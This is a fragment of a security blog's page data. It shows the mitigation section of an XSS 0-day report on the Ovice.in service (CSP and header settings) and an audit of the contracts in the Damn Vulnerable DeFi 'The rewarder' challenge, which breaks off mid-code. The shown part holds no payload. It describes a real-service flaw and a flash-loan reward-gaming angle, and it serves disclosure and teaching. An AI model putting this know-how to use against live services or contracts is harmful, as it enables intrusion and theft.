punctuation\">}</span></code></pre></div>\n<h2 id=\"security-countermeasure\" style=\"position:relative;\"><a href=\"#security-countermeasure\" aria-label=\"security countermeasure permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Security Countermeasure</h2>\n<h3 id=\"quill-editor-security-settings-are-insufficient\" style=\"position:relative;\"><a href=\"#quill-editor-security-settings-are-insufficient\" aria-label=\"quill editor security settings are insufficient permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Quill-editor security settings are insufficient.</h3>\n<ul>\n<li>The object picket can be changed to html through the editor function when an image is registered in using the quill-editor.</li>\n<li>However, it was an XSS attack because all tags except script tags were operated, so it is important to select the necessary tags through a white list method.</li>\n<li>It is recommended to establish a security policy using the functions provided by the editor.</li>\n</ul>\n<h3 id=\"lets-have-a-safe-client-life-by-applying-content-security-policy-security\" style=\"position:relative;\"><a href=\"#lets-have-a-safe-client-life-by-applying-content-security-policy-security\" aria-label=\"lets have a safe client life by applying content security policy security permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Lets have a safe client life by applying Content-Security-Policy security.</h3>\n<ul>\n<li>Looking at the client-side security techniques of web applications, security techniques for CSPs are currently applied, but only security techniques for <code class=\"language-text\">iframe</code> are applied.</li>\n<li>Of course, due to the nature of the service, I dont think the security policy has been set, but script-src and object-src policies are currently not at stake, so it is possible to load external scripts or request external attacks.</li>\n<li>Therefore, CSP script-src, object-src policies should be set so that only script can be used within the domain ovice.in.</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"python\"><pre class=\"language-python\"><code class=\"language-python\">Content<span class=\"token operator\">-</span>Security<span class=\"token operator\">-</span>Policy<span class=\"token punctuation\">:</span> default<span class=\"token operator\">-</span>src <span class=\"token string\">'self'</span> https<span class=\"token punctuation\">:</span><span class=\"token operator\">//</span><span class=\"token operator\">*</span><span class=\"token punctuation\">.</span>ovice<span class=\"token punctuation\">.</span><span class=\"token keyword\">in</span></code></pre></div>\n<ul>\n<li>As a result of web application analysis, most cases have statically inserted scripts into html internally, so it is also good to give nonce attributes to allow only the scripts.</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"python\"><pre class=\"language-python\"><code class=\"language-python\">Content<span class=\"token operator\">-</span>Security<span class=\"token operator\">-</span>Policy<span class=\"token punctuation\">:</span> default<span class=\"token operator\">-</span>src <span class=\"token string\">'nonce-ingjoigrogj/jfeo+iegi=='</span><span class=\"token punctuation\">;</span> base<span class=\"token operator\">-</span>uri</code></pre></div>\n<h3 id=\"x-xss-protection-header-settings\" style=\"position:relative;\"><a href=\"#x-xss-protection-header-settings\" aria-label=\"x xss protection header settings permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>X-XSS protection Header Settings</h3>\n<ul>\n<li>By setting X-XSS protection in the header, it is possible to filter the users input value through the browser end.</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"python\"><pre class=\"language-python\"><code class=\"language-python\">X<span class=\"token operator\">-</span>XSS<span class=\"token operator\">-</span>Protection<span class=\"token punctuation\">:</span> <span class=\"token number\">1</span> <span class=\"token operator\">-</span><span class=\"token operator\">></span> Browser XSS<span class=\"token operator\">-</span>Filter Enable</code></pre></div>\n<ul>\n<li>Although it can only prevent attacks in which the users input value is exposed as it is, it can be used as an auxiliary means.</li>\n</ul>\n<div class=\"table-of-contents\">\n<ul>\n<li>\n<p><a href=\"#attack-type\">Attack Type</a></p>\n</li>\n<li>\n<p><a href=\"#attack-effect\">Attack Effect</a></p>\n</li>\n<li>\n<p><a href=\"#found-location\">Found Location</a></p>\n</li>\n<li>\n<p><a href=\"#attack-point\">Attack Point</a></p>\n<ul>\n<li><a href=\"#picket-object-function\">Picket Object function</a></li>\n</ul>\n</li>\n<li>\n<p><a href=\"#vulnerability-description\">Vulnerability Description</a></p>\n<ul>\n<li><a href=\"#client-side-security-check\">Client Side Security Check</a></li>\n<li><a href=\"#problem-with-security-setting-defect-in-quill-editor\">Problem with security setting defect in quill-editor</a></li>\n<li><a href=\"#static-object-function-to-strengthen-vulnerabilities\">Static-Object function to strengthen vulnerabilities</a></li>\n</ul>\n</li>\n<li>\n<p><a href=\"#payload\">Payload</a></p>\n</li>\n<li>\n<p><a href=\"#security-countermeasure\">Security Countermeasure</a></p>\n<ul>\n<li><a href=\"#quill-editor-security-settings-are-insufficient\">Quill-editor security settings are insufficient.</a></li>\n<li><a href=\"#lets-have-a-safe-client-life-by-applying-content-security-policy-security\">Lets have a safe client life by applying Content-Security-Policy security.</a></li>\n<li><a href=\"#x-xss-protection-header-settings\">X-XSS protection Header Settings</a></li>\n</ul>\n</li>\n</ul>\n</div>\n<div class=\"gatsby-highlight\" data-language=\"toc\"><pre class=\"language-toc\"><code class=\"language-toc\"></code></pre></div>","frontmatter":{"date":"August 01, 2022","title":"Ovice.in Picket Static Object XSS 0-day Vulnerability Report","categories":"0-day","author":"Zer0Luck","emoji":""},"fields":{"slug":"/Ovice.in-XSS-unsafe-token-theft/"}},"prev":{"id":"71cd0a11-64e0-5b6b-8381-84f72e67440d","html":"<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 56.111111111111114%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAALCAIAAADwazoUAAAACXBIWXMAAAsTAAALEwEAmpwYAAACg0lEQVQoz1WRS2sTUQCFb+Z5Z9JpksmrmZlk5s4kmU6TNE2bTJqmebRJ2iZ9mNSaKqU2GluVolgXUhFEEEELvnDjxp0LN7oQFS2IbnRTwSeIoIguBJf+AZFaN8Lh7L6z+A64cni6mR228UaHvZtzGJzDsDkjrq4474m5uvp4T8zhjjncUd4Tc3rjdmdPtzmzdP7W2Mo5tdwCiqi7HUGcUjBKxijFQgYoVhP8Sa/Y70eDfpT2SQM+KSnKpqxlhEAylpqaPXZh14lLxtxJYPmLERCRjEpARDEqCREJEQEVzm6IckrWMrKWCaC0GsrKakYNDcfSM2a1FSzsAzijkrYITmmADBDWMMADgFS2GxMBJgFcAhYRI7fXaVYjIbJYBAIiglFZmw6MTH22vV4ePxQfrOfrK2O1dnGyXRxvFUvNoVwjm29UJhYivSUCIgB8ECpmokxAGacR0xECaqI6u7A2UVvuH9o9Wl8ulBdHptuVyVY214j2VXz+pBYetruiLBfSkVmrrn55811GeYAJnN0AojGSqS0l881YcsrIzcuhUiLdMIdmBswJuysKLAKGSwAIHiH16cGTrXvvXj79vbpyE6MVmg0CWyDD6xWXXOx0pzi14hJz7mBRCuadnp4diySj4rRi5XsX2xsbFx/fuPrq9NrtLiENSD84sn/91PHLc1Nrolp0GlURjXr1kqKX7E6D5YI4jbb1QESxmlfKxfvmC8Mtc6DJO/utTBz8fPb+14tvH+6+Pbp4VgqXbK4EwxkMF6ZYlWT+kTvZuZCzJgOde3sdZwb562DrzubXR69/bH6+f+2hrhYAIRFQwWkFh/+RBEQ4jVhbOOI/sCf4/KD+sS5v/gGkJ39rK2TohgAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"the-rewarder-contract\"\n        title=\"the-rewarder-contract\"\n        src=\"/static/aca6b929208782779f919da69752d9eb/37523/c5.png\"\n        srcset=\"/static/aca6b929208782779f919da69752d9eb/e9ff0/c5.png 180w,\n/static/aca6b929208782779f919da69752d9eb/f21e7/c5.png 360w,\n/static/aca6b929208782779f919da69752d9eb/37523/c5.png 720w,\n/static/aca6b929208782779f919da69752d9eb/e996b/c5.png 1050w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<p><strong>Wargame Provider: @tinchoabbate</strong></p>\n<blockquote>\n<p>Challenge #5  The rewarder</p>\n</blockquote>\n<p>Theres a pool offering rewards in tokens every 5 days for those who deposit their DVT tokens into it.\nAlice, Bob, Charlie and David have already deposited some DVT tokens, and have won their rewards!\nYou dont have any DVT tokens. But in the upcoming round, you must claim most rewards for yourself.\nOh, by the way, rumours say a new pool has just landed on mainnet. Isnt it offering DVT tokens in flash loans?</p>\n<ul>\n<li><a href=\"https://github.com/tinchoabbate/damn-vulnerable-defi/tree/v2.1.0/contracts/the-rewarder\">See the contracts</a></li>\n<li><a href=\"https://github.com/tinchoabbate/damn-vulnerable-defi/blob/v2.1.0/test/the-rewarder/the-rewarder.challenge.js\">Complete the challenge</a></li>\n</ul>\n<h2 id=\"code-audit\" style=\"position:relative;\"><a href=\"#code-audit\" aria-label=\"code audit permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Code Audit</h2>\n<blockquote>\n<p>FlashLoanerPool.sol</p>\n</blockquote>\n<h3 id=\"dependency\" style=\"position:relative;\"><a href=\"#dependency\" aria-label=\"dependency permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Dependency</h3>\n<ul>\n<li>The openzeppelin library ReentrancyGuard and Address contract are dependent and used.</li>\n</ul>\n<h3 id=\"functions\" style=\"position:relative;\"><a href=\"#functions\" aria-label=\"functions permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Functions</h3>\n<p><code class=\"language-text\">constructor(address liquidityTokenAddress)</code></p>\n<ul>\n<li>Used as a liquidity token contract management variable. (liquidityToken)</li>\n</ul>\n<p><code class=\"language-text\">function flashLoan(uint256 amount) external nonReentrant</code></p>\n<ul>\n<li>Perform simple flash loan logic. Use the liquidityToken contract function assigned in the initial deployment phase.</li>\n</ul>\n<p> If the value received as a function argument is less than or equal to the value of Liquidity Token, the condition can be passed.</p>\n<p> Borrower can pass if it is in the deployed contract state.</p>\n<ul>\n<li>\n<p>Based on the <code class=\"language-text\">transfer</code> function of the liquidityToken contract, it is transferred to the <code class=\"language-text\">msg.sender</code> target.</p>\n</li>\n<li>\n<p>Call the <code class=\"language-text\">receiverFlashLoan(uint256 amount)</code> function by executing <code class=\"language-text\">functionCall</code> based on <code class=\"language-text\">msg.sender</code>. There is currently no implementation.</p>\n</li>\n</ul>\n<p> The balance value of the liquidityToken contract must be greater than or equal to the previous Balance.</p>\n<blockquote>\n<p>TheRewarderPool.sol</p>\n</blockquote>\n<h3 id=\"dependency-1\" style=\"position:relative;\"><a href=\"#dependency-1\" aria-label=\"dependency 1 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Dependency</h3>\n<ul>\n<li>RewardToken, DammValuableToken (Liquidity Token), and AccoutingToken Contract are subordinated.</li>\n</ul>\n<h3 id=\"state-variable\" style=\"position:relative;\"><a href=\"#state-variable\" aria-label=\"state variable permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>State Variable</h3>\n<p><code class=\"language-text\">uint256 private constant REWARDS_ROUND_MIN_DURATION = 5 days</code></p>\n<ul>\n<li>Used to measure the minimum duration of a reward round. (in seconds, 24 * 60 * 60 * 5)</li>\n</ul>\n<p><code class=\"language-text\">uint256 public lastSnapshotIdForRewards , uint256 public lastRecordedSnapshotTimestamp , uint256 public roundNumber;</code></p>\n<ul>\n<li>\n<p>Dependent variables used in the reward payment logic. If the current time is greater than or equal to the value of the <code class=\"language-text\">lastRecordedSnapshotTimestamp</code> variable plus the value of <code class=\"language-text\">REWARDS_ROUND_MIN_DURATION</code>, then these variables are updated and the snapshot is nominally updated, as well as the value of each round.</p>\n</li>\n<li>\n<p>You can check the reward tracking function and the pattern required for the reward logic to be executed in units of 5 days.</p>\n</li>\n</ul>\n<p><code class=\"language-text\">mapping(address => uint256) public lastRewardTimestamps;</code></p>\n<ul>\n<li>It is used to determine the value based on the <code class=\"language-text\">_hasRetrievedReward</code> function. In the mapping structure, you can check that the address of the user who will receive each reward is the key, and the value is the time when each reward is received.</li>\n</ul>\n<h3 id=\"functions-1\" style=\"position:relative;\"><a href=\"#functions-1\" aria-label=\"functions 1 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Functions</h3>\n<p><code class=\"language-text\">constructor(address tokenAddress)</code></p>\n<ul>\n<li>\n<p>Allocate and initialize variables for liquidityToken, AccountToken, and RewardToken contract control.</p>\n</li>\n<li>\n<p><code class=\"language-text\">_recordSnapshot();</code> The function that initializes the snapshot function is called directly from within, and this is a function that is called once when deploying the contract.</p>\n</li>\n</ul>\n<p><code class=\"language-text\">function deposit(uint256 amountToDeposit) external</code></p>\n<p> The value received as a function argument must be unconditionally greater than 0 to pass.</p>\n<ul>\n<li>Based on the mint function of the AccountToken contract, it is created as much as the argument value to <code class=\"language-text\">msg.sender.</code></li>\n<li>To transmit, a token must exist for each user and must be allowed through the <code class=\"language-text\">approve</code> function.</li>\n<li>Call <code class=\"language-text\">distributeRewards()</code> function. (It is assumed that the work of distributing rewards is in progress.)</li>\n</ul>\n<p> Call the transferFrom function of the liquidityToken contract to transfer the tokens held by msg.sender to the current contract as much as the argument of the parent function.</p>\n<p><code class=\"language-text\">function withdraw(uint256 amountToWithdraw) external</code></p>\n<ul>\n<li>Based on the burn function of the AccountToken contract, the token of <code class=\"language-text\">msg.sender</code> is destroyed as much as the argument value of the parent function.</li>\n</ul>\n<p> Pass the value to msg.sender based on the transfer function of the liquidityToken contract.</p>\n<p><code class=\"language-text\">function distributeRewards() public returns (uint256)</code></p>\n<ul>\n<li>This is a core function function that proceeds with the issuance of rewards.</li>\n<li>Calls the <code class=\"language-text\">isNewRewardsRound</code> function to determine whether a reward can be received and when an actual reward is received, the</li>\n<li><code class=\"language-text\">_recordSnapshot()</code> function is called to change the reward status, time, and round status values.</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"solidity\"><pre class=\"language-solidity\"><code class=\"language-solidity\"><span class=\"token keyword\">function</span> <span class=\"token function\">isNewRewardsRound</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token keyword\">view</span> <span class=\"token keyword\">returns</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">bool</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token keyword\">return</span> block<span class=\"token punctuation\">.</span>timestamp <span class=\"token operator\">>=</span> lastRecordedSnapshotTimestamp <span class=\"token operator\">+</span> REWARDS_ROUND_MIN_DURATION<span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span></code></pre></div>\n<ul>\n<li>In order to receive a reward, first deposit the token, pass this function after 5 days, record a snapshot and calculate each reward before receiving the value.</li>\n</ul>\n<p>Lets analyze the reward logic in detail. First, snapshots and rewards are closely related. In a hypothetical scenario, we calculated the value that a user can receive after 5 days after depositing 10 ether.</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 56.111111111111114%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAALCAIAAADwazoUAAAACXBIWXMAAAsTAAALEwEAmpwYAAAB5UlEQVQoz2Ng4VCEIyY2OSY2WTApx8wuDxFkZpeHiEDFORTg6hngLFZOZR5+PW5+Ay5+Ax5+Ay5ebRaQOgVObg0eAZAgN78BL78+G6cKM7sCQjMblwoDg6iZeeqMybfm9exc3L9jTv/hjtZTwqKmLOwKZSU75kw8vbhvx/yeHXOmXvPza2FglGDlVIZqZgdpFvLwqJo14/+0/hfzZ7ya2PN+yqSP0rJ2bFxK7a13pk78Mn/6q+kTXsyc9j8hYR4DozhCM9hmIVfX0pam31U175paPpSUfWpqfCkja8vOrVRdfrmq+mtj84fqmnf19b+jImcyMEmga3ZxKevt+t/c9L697WN93ZfOtjdSMrZsXEp11deaG390tH9sbHjf0f4/OmoWis2snMoMzOKqKjGJ4Qcy4vaWZh9Jjtgb7r+RX9CEhUPR131hcsT+osxDOUn7kyMOmRiWMrBIsXIqIWlmkZCTDXez3uptvyk2aLerxSZHi2V8AsYsHIrWxtNdLbeEem73tt/sbrVNUzWPiU2ahQOhWYmRVVpUzMXMoN3UoNXSpN1Uv91Qt5YTFFuK2poFZgYdZoZtJvqt5oZdcrIhTGwyCM3wxMDMLsvMDkkhcszssuB4VoQIIiMsiQSMlFARVkG4uCIAjLmYpH+LRNcAAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"Reward Logic\"\n        title=\"Reward Logic\"\n        src=\"/static/1364fcd92a932a32028942b23fd957b4/37523/c5-1.png\"\n        srcset=\"/static/1364fcd92a932a32028942b23fd957b4/e9ff0/c5-1.png 180w,\n/static/1364fcd92a932a32028942b23fd957b4/f21e7/c5-1.png 360w,\n/static/1364fcd92a932a32028942b23fd957b4/37523/c5-1.png 720w,\n/static/1364fcd92a932a32028942b23fd957b4/e996b/c5-1.png 1050w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<p>In the initial stage after depositing, you can see that the balance value is allocated to the pool. After 5 days have elapsed, in round 3, the conditions for receiving a reward are met, and the reward value is 1 ether, and 10 ether is recorded in the snapshot.</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 56.111111111111114%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAALCAIAAADwazoUAAAACXBIWXMAAAsTAAALEwEAmpwYAAACiklEQVQoz2Pg4FZTVHC1s06Vl3dh41RhYJZhZJVnYJZRUXaODq3mF9RjYpNn5VBi4VDERAxsnGpRgU2Xjn3ydSvj5tMWlzIUkdDn5tXeuubM7+9/mqvnMzBIsHEps3IqsXGpsHEpwxFIMyuHakpk58ltL+NC2rn5dWQUzKXkTHn4tFcvPvzn2//S/EkgzdwqTKwyDAyiDAziDAwSYFKMmV2BgZ1bTUTEREbWWkDIhJFJioFZipFZmoFBiI9P00gvkJlNjoVDiYFFRlbe2c+nPtCrJMi7ONC30tGpiINHnYGNXcZW2z7ZJznVOzrJO9VYycBMzSzFNz3VKyrGJdpKy46DS5GBQdTfv3XDmv9bFt3bvezexiWv585+Ky5pzcDGKl4c3bRj+s3NfYfWT7zmZeQeahW2bdLtrb0Ht029neqdw8AgwMDA5eFa0db6s6nlbXvn++qaT431DyWlrRjY2cRzQ+rntN5e0Hl6We+FlqrW3oUrFm9/sHjhzU2L3kyecLqg/ZBn4qSomKktzX+raz41NX0uK/vW2vxcWsaagYNDMsI+q69gx7z6TbNqN7bVdk5at2nezqvLllzaMP/B1Ok3muc/iq/Z4hvQX1/xqKnuXkfLg7rKB6UF54RETBm4uaS99MOzPWcVB81OdZlirWzhoO6Y4zWn0H9OrvdcV20/Hn5lBmZRGclgd+v1AS5rowM2e9qstTWZxcNnwMDBKa8ppWusaGcgb2OkaKsmrqouoWGoYGMgb2OsaKsuqc3GIc/AIqmkGOvlsMnLYb2fy0Z3242OVvN5+A0YWDgUGdnkGFhlIIiRTYGRXQGJK8/KqcTMocDNpysu4SYm7iYm7ioh4S4i6sDKqQwA/rjDeoRw8ygAAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"Reward Logic and Withdraw Pattern\"\n        title=\"Reward Logic and Withdraw Pattern\"\n        src=\"/static/2f41a7926691c594c02b6989487d5c8f/37523/c5-2.png\"\n        srcset=\"/static/2f41a7926691c594c02b6989487d5c8f/e9ff0/c5-2.png 180w,\n/static/2f41a7926691c594c02b6989487d5c8f/f21e7/c5-2.png 360w,\n/static/2f41a7926691c594c02b6989487d5c8f/37523/c5-2.png 720w,\n/static/2f41a7926691c594c02b6989487d5c8f/e996b/c5-2.png 1050w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<div class=\"gatsby-highlight\" data-language=\"solidity\"><pre class=\"language-solidity\"><code class=\"language-solidity\"><span class=\"token comment\">// [OMIT]</span>\n<span class=\"token builtin\">uint256</span> totalDeposits <span class=\"token operator\">=</span> accToken<span class=\"token punctuation\">.</span><span class=\"token function\">totalSupplyAt</span><span class=\"token punctuation\">(</span>lastSnapshotIdForRewards<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token builtin\">uint256</span> amountDeposited <span class=\"token operator\">=</span> accToken<span class=\"token punctuation\">.</span><span class=\"token function\">balanceOfAt</span><span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">,</span> lastSnapshotIdForRewards<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>amountDeposited <span class=\"token operator\">></span> <span class=\"token number\">0</span> <span class=\"token operator\">&amp;&amp;</span> totalDeposits <span class=\"token operator\">></span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n            rewards <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>amountDeposited <span class=\"token operator\">*</span> <span class=\"token number\">100</span> <span class=\"token operator\">*</span> <span class=\"token number\">10</span> <span class=\"token operator\">**</span> <span class=\"token number\">18</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">/</span> totalDeposits<span class=\"token punctuation\">;</span>\n\n            <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>rewards <span class=\"token operator\">></span> <span class=\"token number\">0</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token operator\">!</span><span class=\"token function\">_hasRetrievedReward</span><span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n                rewardToken<span class=\"token punctuation\">.</span><span class=\"token function\">mint</span><span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">.</span>sender<span class=\"token 